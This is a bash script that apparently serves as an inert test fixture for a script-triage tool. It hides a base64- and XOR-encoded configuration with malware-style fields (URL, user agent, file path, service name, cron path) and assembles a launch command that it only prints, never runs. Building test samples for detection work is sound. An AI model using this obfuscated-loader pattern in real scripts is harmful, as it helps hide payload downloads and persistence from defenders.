#!/usr/bin/env bash

# Huntress Script Triage -- inert static-analysis fixture (bash_linux)

readonly Material_f8a38a4c='RCTV235GfJTUMF52h8Z5V0aIyG5TdcjDZEFphdNuWkaU1WJRfJfUcVN9hdd5V2vZwnVXervDaEF6ls59RnaW235GeIPCUlF2kcl5DyiYxGxfaYXOalxGjcMwUXiJ12xbfoqKPQUu0pJoV3vXknFUcIjCUkJ4kM8wHW2J1yJabIrTf1dql4puU3qMwiIcapDGalc01JA6BCyBwm8BLA=='

readonly Codec_f8a38a4c='base64_literal|repeating_key_xor|32,19,e4,a7,0d'



Load_f8a38a4c() {

  stored_bytes=()

  local encoded_part

  while read -r encoded_part; do [[ -n "$encoded_part" ]] && stored_bytes+=("$encoded_part"); done < <(printf '%s' "${Material_f8a38a4c}" | base64 --decode | od -An -v -tu1 | tr -s ' ' '\n' | sed '/^$/d')

}



Decode_f8a38a4c() {

  recovered_bytes=()

  local -a key_bytes=(50 25 228 167 13)

  local byte_index

  for ((byte_index=0; byte_index<${#stored_bytes[@]}; byte_index++)); do

    recovered_bytes+=("$((stored_bytes[byte_index] ^ key_bytes[byte_index % ${#key_bytes[@]}]))")

  done

}



Recover_f8a38a4c() {

  local -a stored_bytes recovered_bytes

  local configuration_text harmless_value decode_pass byte_index

  local -a compass=(north south); harmless_value="$(IFS=:; printf '%s' "${compass[*]}")"

  Load_f8a38a4c

  local decode_target=Decode_f8a38a4c; "$decode_target"

  configuration_text=''

  local octal character

  for byte_index in "${!recovered_bytes[@]}"; do

    printf -v octal '%03o' "${recovered_bytes[byte_index]}"

    printf -v character '%b' "\\$octal"

    configuration_text+="$character"

  done

  printf '%s\n' "$configuration_text"

}



Inspect_f8a38a4c() { local recovered field; local -a fields; recovered="$(Recover_f8a38a4c)"; IFS='|' read -r -a fields <<< "$recovered"; (IFS='|'; printf '%s\n' "${fields[*]}"); }



Plan_f8a38a4c() {

  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''

  descriptor="$(Inspect_f8a38a4c)"

  local -a fields

  IFS='|' read -r -a fields <<< "$descriptor"

  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done

  local -a launch_command=(env -- "$file_path")

  declare -p launch_command

}



if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_f8a38a4c; fi

